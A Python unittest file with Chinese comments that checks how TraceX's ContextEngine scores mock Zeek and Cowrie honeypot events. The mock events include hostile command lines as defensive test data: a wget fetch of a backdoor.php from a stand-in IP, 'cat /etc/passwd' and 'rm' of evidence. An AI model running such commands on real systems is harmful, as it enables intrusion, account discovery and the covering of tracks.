import sys
import os
import unittest
import logging

# 确保能导入项目模块
sys.path.append(os.getcwd())

try:
    from analyzer.attack_analyzer.context_engine import ContextEngine
except ImportError:
    print("❌ 无法导入 ContextEngine，请在 TraceX 根目录下运行")
    sys.exit(1)

# 配置日志输出
logging.basicConfig(level=logging.INFO, format='%(message)s')

class MockESClient:
    """模拟 ES 客户端"""
    def __init__(self):
        self.es = None

class TestNetworkCollectorFull(unittest.TestCase):
    """
    组员2 (网络与蜜罐) 全功能验证套件
    覆盖：Zeek 流量分析 (DNS/ICMP 隧道)、Cowrie 蜜罐行为 (登录、指令、APT)
    """
    
    def setUp(self):
        self.engine = ContextEngine(MockESClient())
        print("\n" + "="*80)

    def _verify(self, category, case_name, mock_event, min_score, keywords):
        """通用验证助手"""
        print(f"🧪 [{category}] 测试场景: {case_name}")
        
        # 执行评分
        result = self.engine.evaluate_threat(mock_event)
        score = result['score']
        reasons = result['reasons']
        
        # 打印结果
        print(f"   📊 评分: {score} | 等级: {result['severity'].upper()}")
        print(f"   📝 依据: {reasons}")
        
        # 断言
        try:
            self.assertGreaterEqual(score, min_score, f"分数过低 (预期 >={min_score})")
            
            if isinstance(keywords, str): keywords = [keywords]
            hit = False
            for k in keywords:
                if any(k.lower() in r.lower() for r in reasons):
                    hit = True
                    break
            
            if not hit:
                self.fail(f"缺失关键词: {keywords}")
            
            print("   ✅ [PASS]")
        except AssertionError as e:
            print(f"   ❌ [FAIL] {e}")
            raise e

    # =========================================================================
    # 1. Zeek 网络流量分析 (Network Flows)
    # =========================================================================
    
    def test_01_zeek_normal_traffic(self):
        """场景1: 普通 SSL 流量 (Negative Test)"""
        # 组员2文档: severity=3, 无 threat 标签
        event = {
            "event": {"dataset": "zeek.ssl", "severity": 3, "category": "network"},
            "detection": {"severity": "", "confidence": 0.0},
            "network": {"protocol": "ssl"}
        }
        # 预期: 低分 (Low/Info)，不应触发高危告警
        # 只要不报错且分数低即可 (ContextEngine 默认 0 分)
        print(f"🧪 [Zeek] 测试场景: 普通 SSL 流量")
        result = self.engine.evaluate_threat(event)
        print(f"   📊 评分: {result['score']}")
        self.assertLess(result['score'], 50, "普通流量分数过高")
        print("   ✅ [PASS]")

    def test_02_zeek_dns_tunneling(self):
        """场景2: DNS 隧道检测 (High Risk)"""
        # 组员2文档: severity=7, threat.technique="DNS Tunneling"
        event = {
            "event": {"dataset": "zeek.dns", "severity": 7, "category": "network"},
            "detection": {"severity": "high", "confidence": 0.9, "rules": ["DNS Anomaly: Depth(8)"]},
            "threat": {"technique": {"name": "DNS Tunneling", "id": "T1071.004"}}
        }
        # 预期: Sigma Rule HIGH (80分) 或 ATT&CK 识别
        self._verify("Zeek", "DNS 隧道攻击", event, 80, ["Sigma Rule: HIGH", "DNS Tunneling"])

    def test_03_zeek_icmp_tunneling(self):
        """场景3: ICMP 隧道检测 (High Risk)"""
        # 组员2文档: severity=7, threat.technique="ICMP Tunneling"
        event = {
            "event": {"dataset": "zeek.conn", "severity": 7, "category": "network"},
            "detection": {"severity": "high", "confidence": 0.8, "rules": ["Large ICMP Payload"]},
            "threat": {"technique": {"name": "ICMP Tunneling", "id": "T1071.004"}}
        }
        self._verify("Zeek", "ICMP 隧道攻击", event, 80, ["Sigma Rule: HIGH", "ICMP Tunneling"])

    # =========================================================================
    # 2. Cowrie 蜜罐交互分析 (Honeypot)
    # =========================================================================

    def test_04_cowrie_login_success(self):
        """场景4: 攻击者登录成功 (Entry Point)"""
        # 组员2文档: event.action="success" (登录本身只是 Medium 风险，后续操作才是 Critical)
        event = {
            "event": {"dataset": "cowrie", "category": "authentication", "action": "success"},
            "user": {"name": "root"},
            "source": {"ip": "59.64.129.102"}
        }
        # 预期: 只要是蜜罐活动，起步价就是 Medium (50分)
        self._verify("Cowrie", "蜜罐登录成功", event, 50, "Honeypot Activity")

    def test_05_cowrie_apt_download(self):
        """场景5: APT 工具下载 (Ingress Tool Transfer)"""
        # 组员2文档: command="wget ...", severity=8
        event = {
            "event": {"dataset": "cowrie", "category": "process", "action": "input", "severity": 8},
            "detection": {"severity": "high", "confidence": 1.0}, # 蜜罐里只要敲命令，置信度就是 1.0
            "process": {"command_line": "wget http://1.2.3.4/backdoor.php"},
            "threat": {"technique": {"name": "Ingress Tool Transfer"}}
        }
        # 预期: 蜜罐内执行 input 命令 -> Critical (100分)
        self._verify("Cowrie", "APT 工具下载 (wget)", event, 100, "Honeypot Command")

    def test_06_cowrie_info_gathering(self):
        """场景6: 敏感信息收集 (Account Discovery)"""
        # 组员2文档: command="cat /etc/passwd", severity=7
        event = {
            "event": {"dataset": "cowrie", "category": "process", "action": "input", "severity": 7},
            "detection": {"severity": "medium", "confidence": 0.9},
            "process": {"command_line": "cat /etc/passwd"},
            "threat": {"technique": {"name": "Account Discovery"}}
        }
        # 预期: 蜜罐内执行 input 命令 -> Critical (100分)
        # 即使 detection.severity 是 medium，因为是蜜罐 input，ContextEngine 会强制升为 100
        self._verify("Cowrie", "敏感信息窃取", event, 100, "Honeypot Command")

    def test_07_cowrie_trace_removal(self):
        """场景7: 痕迹清除 (Indicator Removal)"""
        # 组员2文档: command="rm ...", severity=6
        event = {
            "event": {"dataset": "cowrie", "category": "process", "action": "input", "severity": 6},
            "detection": {"severity": "medium", "confidence": 0.7},
            "process": {"command_line": "rm /tmp/evidence.txt"},
            "threat": {"technique": {"name": "Indicator Removal"}}
        }
        # 预期: 蜜罐内执行 input 命令 -> Critical (100分)
        self._verify("Cowrie", "痕迹清除 (rm)", event, 100, "Honeypot Command")

if __name__ == '__main__':
    print("🚀 TraceX 网络与蜜罐采集全功能验证开始...")
    unittest.main(verbosity=0)
